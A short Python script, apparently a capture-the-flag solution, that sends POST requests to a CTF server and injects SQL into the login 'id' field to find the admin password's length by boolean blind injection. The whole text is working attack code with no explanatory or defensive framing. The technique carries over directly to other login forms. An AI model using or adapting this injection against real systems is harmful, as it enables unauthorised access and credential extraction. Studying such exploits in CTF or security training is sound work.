import requests
url = "http://ctfq.sweetduet.info:10080/~q6/"

for i in range(0,100):
  data = {"id": "admin' AND LENGTH(user.pass) = "+str(i)+"  /*"}
  if "Congratulations!<br>" in requests.post(url, data).text:
    print(i)
    break
